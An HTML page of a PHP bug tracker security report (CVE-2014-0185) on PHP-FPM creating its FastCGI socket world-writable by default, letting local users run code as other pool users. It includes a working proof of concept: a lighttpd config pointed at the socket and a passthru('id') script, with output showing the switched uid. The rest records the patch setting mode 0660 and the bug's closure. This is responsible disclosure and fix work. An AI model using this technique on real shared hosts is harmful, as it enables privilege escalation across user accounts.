<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='FPM related Bug #67060 - RDF' href='rss/bug.php?id=67060'>
        <link rel='alternate' type='application/rss+xml' title='FPM related Bug #67060 - RSS 2.0' href='rss/bug.php?id=67060&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #67060 :: sapi/fpm: possible privilege escalation due to insecure default configuration</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=67060">Sec Bug</a>&nbsp;#67060</th>
            <td id="summary" colspan="5">sapi/fpm: possible privilege escalation due to insecure default configuration</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2014-04-12 21:32 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2014-05-02 06:57 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>christian &#x61;&#116; hoffie &#x64;&#111;&#x74; info</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=FPM+related">FPM related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6Git-2014-04-12 (Git)</td>
            <th class="details">OS:</th>
            <td>*nix</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0185" target="_blank">2014-0185</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=67060&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=67060&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=67060&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1397338326">&nbsp;</a><strong>[2014-04-12 21:32 UTC] christian &#x61;&#116; hoffie &#x64;&#111;&#x74; info</strong>
<pre class='note'>Description:
------------
Both default config [1] and compiled-in defaults [2] of sapi/fpm lead to configurations which easily allow any user with rights to connect to a UNIX socket to run arbitrary code with the permissions of the fpm user.

I agree that similar problems are to be expected when using TCP sockets, but as soon as an admin chooses to set the listen.user/listen.group options, it is expected that these restrictions are effective somehow (which they are not).

A typical scenario for this issue:
- shared hosting environment with multiple fpm pools, running with different permissions (user1, user2, ...)
- user1 can easily run code as user2 by pretending to be a FastCGI client and connecting to (e.g.) /var/run/php-fpm.user1.sock

Other scenarios are possible as well.

This is not a hypothetical issue, Ubuntu 14.04 allows running arbitrary code as the &quot;www-data&quot; user. I will file an Ubuntu bug for this shortly as well.

Current git (ca447a8f6f65be565301350e27e0f6a57369a0f9) is affected, but earlier versions are probably affected, too.

Regarding the handling of this issue:
I suspect that this issue is of different severity for you and for distros shipping with insecure default configs.

Would it be possible to keep this issue private and have no code committed yet, but to notify distros@openwall.org once a patch is ready?

Please let me know whether you are ok with this and whether you want me to handle distros@ contact.


[1] <a href="https://github.com/php/php-src/blob/php-5.5.11/sapi/fpm/php-fpm.conf.in#L172" rel="nofollow">https://github.com/php/php-src/blob/php-5.5.11/sapi/fpm/php-fpm.conf.in#L172</a>
[2] <a href="https://github.com/php/php-src/blob/php-5.5.11/sapi/fpm/fpm/fpm_unix.c#L31" rel="nofollow">https://github.com/php/php-src/blob/php-5.5.11/sapi/fpm/fpm/fpm_unix.c#L31</a>

Test script:
---------------
php-fpm.conf
------------

[global]
error_log = /tmp/php-fpm-vuln/php-fpm-error.log

[www]
user = user1
group = user1
listen = /tmp/php-fpm-vuln/sock
pm = dynamic
pm.max_children = 5 
pm.start_servers = 2 
pm.min_spare_servers = 1 
pm.max_spare_servers = 3 

$ sudo ./php-fpm -y php-fpm.conf
$ ls -l /tmp/php-fpm-vuln/sock
srw-rw-rw- 1 root root 0 Apr 12 12:49 sock


The issue should be obvious by now, but exploiting it is trivial as well, just point some FastCGI client at the socket.

For quick testing I used lighty:

user2@localhost:/tmp/lighty$ cat &gt; lighttpd.conf
server.modules = ( &quot;mod_fastcgi&quot; )
fastcgi.server = (
        &quot;.php&quot; =&gt; (
                &quot;&quot; =&gt; (
                        &quot;socket&quot; =&gt; &quot;/tmp/php-fpm-vuln/sock&quot;,
                        &quot;check-local&quot; =&gt; &quot;enable&quot;
                )
        )
)

server.port = 8000
server.document-root = &quot;/tmp/lighty&quot;

user2@localhost:/tmp/lighty$ vim lighttpd.conf 
user2@localhost:/tmp/lighty$ echo '&lt;?php passthru(&quot;id&quot;);' &gt; id.php
user2@localhost:/tmp/lighty$ lighttpd -f lighttpd.conf 
user2@localhost:/tmp/lighty$ curl <a href="http://localhost:8000/id.php" rel="nofollow">http://localhost:8000/id.php</a>
uid=1001(user1) gid=1001(user1) groups=1001(user1)


Expected result:
----------------
Sockets should be created with sane default permissions (0660).
Default config should suggest sane default permissions (0660).

The PoC should return some error code (depending on the FastCGI client; in my case: 503 Service unavailable) once this is fixed.

Actual result:
--------------
$ ls -l /tmp/php-fpm-vuln/sock
srw-rw-rw- 1 root root 0 Apr 12 12:49 sock

user2 can run code with the permissions of user1.

</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=67060&amp;patch=mode660&amp;revision=latest" >mode660</a>
(last revision 2014-04-15 18:23 UTC by stas@php.net)
<br><p><a href='patch-add.php?bug_id=67060'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=67060'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_patch' ><a name="1397586193">&nbsp;</a><strong>[2014-04-15 18:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: mode660
Revision:   1397586192
URL:        <a href="https://bugs.php.net/patch-display.php?bug=67060&amp;patch=mode660&amp;revision=1397586192" rel="nofollow">https://bugs.php.net/patch-display.php?bug=67060&amp;patch=mode660&amp;revision=1397586192</a>
</pre>
</div><div class='comment type_comment' ><a name="1397586255">&nbsp;</a><strong>[2014-04-15 18:24 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Mail to distros@openwall.org bounces for me, so attaching the patch here for now. Will wait till 5.4.28 with merge.
</pre>
</div><div class='comment type_log' ><a name="1398157304">&nbsp;</a><strong>[2014-04-22 09:01 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2014-0185</span>
</div></div></div><div class='comment type_log' ><a name="1399013873">&nbsp;</a><strong>[2014-05-02 06:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Closed</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1399013873">&nbsp;</a><strong>[2014-05-02 06:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.


</pre>
</div><div class='comment type_svn' ><a name="1399916673">&nbsp;</a><strong>[2014-05-12 17:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1400482408">&nbsp;</a><strong>[2014-05-19 06:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1401085973">&nbsp;</a><strong>[2014-05-26 06:32 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1401087005">&nbsp;</a><strong>[2014-05-26 06:50 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1401087210">&nbsp;</a><strong>[2014-05-26 06:53 UTC] <a href="//people.php.net/dmitry">dmitry@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1401844950">&nbsp;</a><strong>[2014-06-04 01:22 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1412723705">&nbsp;</a><strong>[2014-10-07 23:15 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src-security.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src-security.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1412723715">&nbsp;</a><strong>[2014-10-07 23:15 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src-security.git;a=commit;h=35ceea928b12373a3b1e3eecdc32ed323223a40d" rel="nofollow">http://git.php.net/?p=php-src-security.git;a=commit;h=35ceea928b12373a3b1e3eecdc32ed323223a40d</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1412724374">&nbsp;</a><strong>[2014-10-07 23:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src-security.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238" rel="nofollow">http://git.php.net/?p=php-src-security.git;a=commit;h=8a22540a95db7c8a9857efc2ced8b91ceffda238</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div><div class='comment type_svn' ><a name="1412724383">&nbsp;</a><strong>[2014-10-07 23:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src-security.git;a=commit;h=35ceea928b12373a3b1e3eecdc32ed323223a40d" rel="nofollow">http://git.php.net/?p=php-src-security.git;a=commit;h=35ceea928b12373a3b1e3eecdc32ed323223a40d</a>
Log: Fix <a href='bug.php?id=67060'>bug #67060</a>: use default mode of 660
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
